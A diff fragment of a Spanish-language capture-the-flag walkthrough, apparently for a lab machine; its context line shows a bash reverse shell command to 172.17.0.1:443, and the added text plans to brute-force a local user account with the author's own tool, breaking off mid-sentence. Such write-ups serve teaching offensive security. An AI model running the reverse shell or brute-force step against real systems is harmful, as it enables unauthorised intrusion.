@@ -74,6 +74,10 @@ bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'
 Y finalmente tendremos acceso a la máquina.
 
 ## Paso N6: Cambiando de usuarios
-Una vez dentro, en el directorio ```/home/``` veremos que tenemos 4 usuarios, por lo que 
+Una vez dentro, en el directorio ```/home/``` veremos que tenemos 4 usuarios, por lo que tendremos que buscar acceder a uno de ellos. Obviaremos las técnicas usuales de búsqueda de credenciales ya que ninguna se aplica en esta máquina.
+
+Para poder acceder a uno de los usuarios, tendremos que hacer fuerza bruta mediante algún script/programa externo, ya que no estamos en un servidor ssh o ftp.
+
+Utilizaremos una herramienta creada por mi llama 
 
 
